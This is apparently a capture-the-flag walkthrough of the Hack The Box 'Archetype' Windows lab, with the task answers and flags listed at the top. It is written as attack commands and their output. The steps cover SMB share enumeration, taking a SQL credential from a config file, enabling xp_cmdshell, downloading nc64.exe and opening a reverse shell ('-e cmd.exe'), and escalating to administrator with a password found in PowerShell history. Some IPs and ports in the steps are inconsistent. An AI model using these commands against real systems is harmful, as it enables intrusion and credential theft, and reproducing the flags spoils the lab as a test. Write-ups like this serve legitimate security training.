	# Tasks
- Which TCP port is hosting a database server?
	- 1433
- What is the name of the non-Administrative share available over SMB?
	- backups
- What is the password identified in the file on the SMB share?
	- M3g4c0rp123
- What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
	- mssqlclient.py
- What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
	- xp_cmdshell
- What script can be used in order to search possible paths to escalate privileges on Windows hosts?
	- WinPEAS
- What file contains the administrator's password?
	- ConsoleHost_history.txt
- Submit user flag
	- 3e7b102e78218e935bf3f4951fec21a3
- Submit root flag
	- b91ccec3305e98240082d4474b848528


# Steps
- First, we'll run rustscan to see what is going on
```
rustscan --ulimit 5000 --addresses "10.129.95.187" --top -- -sC -sV
```
- From the results, we can see that a database is being ran at 1433
```
PORT      STATE SERVICE      REASON          VERSION                                                                                                                                                                                           
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                                                                                             
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                                                                                     
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2019 Standard 17763 microsoft-ds                                                                                                                                                   
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM                                                                                                                                                      
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                                                                                                       
| Issuer: commonName=SSL_Self_Signed_Fallback                                                                                                                                                                                                  
| Public Key type: rsa                                                                                                                                                                                                                         
| Public Key bits: 2048                                                                                                                                                                                                                        
| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                                                                                 
| Not valid before: 2025-11-26T20:18:48                                                                                                                                                                                                        
| Not valid after:  2055-11-26T20:18:48                                                                                                                                                                                                        
| MD5:   cb632cff9e54f1b7d70b69c947c57d18                                                                                                                                                                                                      
| SHA-1: 7e59b57dd9499ec2527cb6e8e3ac2e75055ade61                                                                                                                                                                                              
| -----BEGIN CERTIFICATE-----                                                                                                                                                                                                                  
| MIIDADCCAeigAwIBAgIQG0DlVqb1YrpJYGrmxclPvDANBgkqhkiG9w0BAQsFADA7                                                                                                                                                                             
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA                                                                                                                                                                             
| bABsAGIAYQBjAGswIBcNMjUxMTI2MjAxODQ4WhgPMjA1NTExMjYyMDE4NDhaMDsx                                                                                                                                                                             
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs                                                                                                                                                                             
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJwFiNur                                                                                                                                                                             
| bhuQAKuSUkQrTVIxOT/WEFZGdfsIJvKHYQ3CaM+jtBS4JPRPsPzqDnqvCi0q7AlC                                                                                                                                                                             
| 82S2u6pj6PU1l7MnvoogWiRcaEq0wr2nvQq6b5O9FfcDy2+MZtg0Jg9HfSjDdE0P                                                                                                                                                                             
| GCj34wyH4Z0IofLEOO1SRqizMQucO1uHzqAh2H5Thiyr4DqBc4ZAVI5Nq0xj3fV3                                                                                                                                                                             
| vRjuYhVyEFmkhTUXZPs6u9C28aSb47Q6dp6n5kWcspsL8/GDbx5kREodFs44AJ/R                                                                                                                                                                             
| 9NbtfNqUjkyc2n+1GrNN24mcMcvSWaUgiUOYrUKiU9jQEMWWQfM3HzLSj61tID7X                                                                                                                                                                             
| y7GwYC8scYhf+NUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAcOJt9Ep9dYVxBY4a                                                                                                                                                                             
| SVPhZLTRkgpZZB0jB4dVK3MnZEKj5MAfLpsgs5TC+26nxKow0x054TmLRnBZOMll                                                                                                                                                                             
| BdiEEKfFMSiBUuR620E4cDT/TtA9TSyqAZ1mOyAJvLQVycm9V/St95so0I0Gc4/E                                                                                                                                                                             
| 8ObLKaTYwOytgtOlWvVaVOoI6DyHv0SKUa+Pa66bO7KC9XZRw4m8r+muaMH5TFre                                                                                                                                                                             
| y0d00jYcbHd3C8YRrUgvtmmYGpm3TM+RuX2Xzoz32Y+u4ZSzBZWsZgvjcKye8lxH                                                                                                                                                                             
| fBKldEcd/fomiyGyKgD6vW7es8mhDieiYtAjNiCX/WDLs3MdUoIJqzUGxijoxKuX                                                                                                                                                                             
| qZWuJQ==  
|_-----END CERTIFICATE-----  
|_ssl-date: 2025-11-26T20:22:00+00:00; -15s from scanner time.  
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)  
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)  
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb2-time:    
|   date: 2025-11-26T20:21:52  
|_  start_date: N/A  
| p2p-conficker:    
|   Checking for Conficker.C or higher...  
|   Check 1 (port 32731/tcp): CLEAN (Couldn't connect)  
|   Check 2 (port 30913/tcp): CLEAN (Couldn't connect)  
|   Check 3 (port 35816/udp): CLEAN (Timeout)  
|   Check 4 (port 4389/udp): CLEAN (Failed to receive data)    
|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
| smb-security-mode:    
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)  
|_clock-skew: mean: 1h59m46s, deviation: 4h00m01s, median: -15s  
| smb-os-discovery:    
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)  
|   Computer name: Archetype  
|   NetBIOS computer name: ARCHETYPE\x00  
|   Workgroup: WORKGROUP\x00  
|_  System time: 2025-11-26T12:21:53-08:00  
| smb2-security-mode:    
|   311:    
|_    Message signing enabled but not required
```
- We also see SMB running on this box as well, so we can use smbclient to see if there are any connectable shares we can see
```
smbclient -L 10.129.95.187
```
- Looks like we have one named backups
```
Password for [WORKGROUP\root]:  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       backups         Disk         
       C$              Disk      Default share  
       IPC$            IPC       Remote IPC  
SMB1 disabled -- no workgroup available
```
- We can now attempt to connect to that share
```
smbclient //10.129.95.187/backups
```
- Once connected, we can download the file there
```
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Mon Jan 20 04:20:57 2020  
 ..                                  D        0  Mon Jan 20 04:20:57 2020  
 prod.dtsConfig                     AR      609  Mon Jan 20 04:23:02 2020  
  
               5056511 blocks of size 4096. 2616930 blocks available  
smb: \> get prod.dtsConfig  
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)  
smb: \> exit
```
- Printing out this file, we are able to grab out a password
```
<DTSConfiguration>  
   <DTSConfigurationHeading>  
       <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>  
   </DTSConfigurationHeading>  
   <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">  
       <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>  
   </Configuration>  
</DTSConfiguration>#
```
- It appears to be a password relevant for a SQL database
- We can use Impacket's MSSQL script to connect to the database. We are able to do this successfully
```
[Nov 26, 2025 - 14:54:52 (PST)] exegol-htb-starting-point /workspace # mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth  
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies    
  
Password:  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.  
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)    
[!] Press help for extra shell commands  
SQL (ARCHETYPE\sql_svc  dbo@master)>
```
- We can run the help command to see what is available to use
```
SQL (ARCHETYPE\sql_svc  dbo@master)> help  
  
   lcd {path}                 - changes the current local directory to {path}  
   exit                       - terminates the server process (and this session)  
   enable_xp_cmdshell         - you know what it means  
   disable_xp_cmdshell        - you know what it means  
   enum_db                    - enum databases  
   enum_links                 - enum linked servers  
   enum_impersonate           - check logins that can be impersonated  
   enum_logins                - enum login users  
   enum_users                 - enum current db users  
   enum_owner                 - enum db owner  
   exec_as_user {user}        - impersonate with execute as user  
   exec_as_login {login}      - impersonate with execute as login  
   xp_cmdshell {cmd}          - executes cmd using xp_cmdshell  
   xp_dirtree {path}          - executes xp_dirtree on the path  
   sp_start_job {cmd}         - executes cmd using the sql server agent (blind)  
   use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)  
   ! {cmd}                    - executes a local shell cmd  
   upload {from} {to}         - uploads file {from} to the SQLServer host {to}  
   download {from} {to}       - downloads file from the SQLServer host {from} to {to}  
   show_query                 - show query  
   mask_query                 - mask query  
      
SQL (ARCHETYPE\sql_svc  dbo@master)>
```
- First, let's confirm that we are in fact, logged in as the administrator of this database
```
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');  
      
-      
1
```
- Looks like we are, so we can use some admin commands to work ourselves through it
```
EXEC xp_cmdshell 'net user';
```
- We'll use this to check if this command is activated, in which it will allow us to spawn shell instances.
```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';  
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable  
the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
- This command is not activated, so we need to do the steps to do so
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
- Now, let's try that again
```
xp_cmdshell "whoami"
```
- Finally, we are able to use this command!
```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"  
output                 
-----------------      
archetype\sql_svc      
  
NULL
```
- So, we should be able to use this to our advantage. Let's say, a reverse shell can be executed from here!
- We'll use a binary to run our shell, specifically this one pointed out from this box.
- So, let's download a copy
```
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc64.exe
```
- We can spin up a temp web server on our machine for the victim to download from
- Let's also create a listener to capture the input (using tmux to make this easier)
```
python3 -m http.server 80
nc -lvnp 443
```
- Also doing some additional testing, looks like we can call powershell as well
```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c pwd"  
output                   
-------------------      
NULL                     
  
Path                     
  
----                     
  
C:\Windows\system32      
  
NULL                     
  
NULL                     
  
NULL
```
- Now, let's download the file onto the machine
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.82/nc64.exe -outfile nc64.exe"
```
- Time to run it and bind to our listener
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.129.95.187 443"
```
- We are able to get access onto the machine
```
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444  
Ncat: Listening on 0.0.0.0:4444  
Ncat: Connection from 10.129.95.187.  
Ncat: Connection from 10.129.95.187:49676.  
Microsoft Windows [Version 10.0.17763.2061]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\users\sql_svc\Downloads>
```
- We can grab the user flag with no issue
```
C:\Users\sql_svc\Desktop>type user.txt  
type user.txt  
3e7b102e78218e935bf3f4951fec21a3
```
- Now, we need to escalate our privileges to get the root flag
- We'll use WinPEAS for that.
- We can go ahead and download a copy onto the victim
```
C:\Users\sql_svc\Desktop>powershell                                                 
powershell  
Windows PowerShell    
Copyright (C) Microsoft Corporation. All rights reserved.  
  
PS C:\Users\sql_svc\Desktop> wget http://10.10.14.82:8000/winPEASx64.exe -outfile winPEASx64.exe  
wget http://10.10.14.82:8000/winPEASx64.exe -outfile winPEASx64.exe  
PS C:\Users\sql_svc\Desktop> ls  
ls  
  
  
   Directory: C:\Users\sql_svc\Desktop  
  
  
Mode                LastWriteTime         Length Name                                                                     
----                -------------         ------ ----                                                                     
-a----       11/27/2025  10:23 PM              0 type                                                                     
-ar---        2/25/2020   6:37 AM             32 user.txt                                                                 
-a----       11/27/2025  10:25 PM       10166272 winPEAx64.exe
```
- We can now run it to find something
- From the results, we can see that this machine is vulnerable to the juicy potato exploit
- First though, let's check a possible place where the password can easily leak out: PowerShell history
- We can find this within this directory:
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
```
- Once we are there, we can then read out the ConsoleHost_history.txt file by using type:
```
type ConsoleHost_history.txt
```
- We then get the following output, in which we can get a password:
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!  
exit  
```
- Now, we can use a script like psexec.py to get a shell into the system:
```
psexec.py administrator@10.129.11.151
```
- From here, we can see that we get to be the administrator now. Yay!
```
C:\Windows\system32> whoami  
nt authority\system
```
- From here, let's go ahead and grab the root flag
```
C:\Users\Administrator\Desktop> dir  
Volume in drive C has no label.  
Volume Serial Number is 9565-0B4F  
  
Directory of C:\Users\Administrator\Desktop  
  
07/27/2021  01:30 AM    <DIR>          .  
07/27/2021  01:30 AM    <DIR>          ..  
02/25/2020  06:36 AM                32 root.txt  
              1 File(s)             32 bytes  
              2 Dir(s)  10,708,439,040 bytes free  
  
C:\Users\Administrator\Desktop> type root.txt  
b91ccec3305e98240082d4474b848528
```
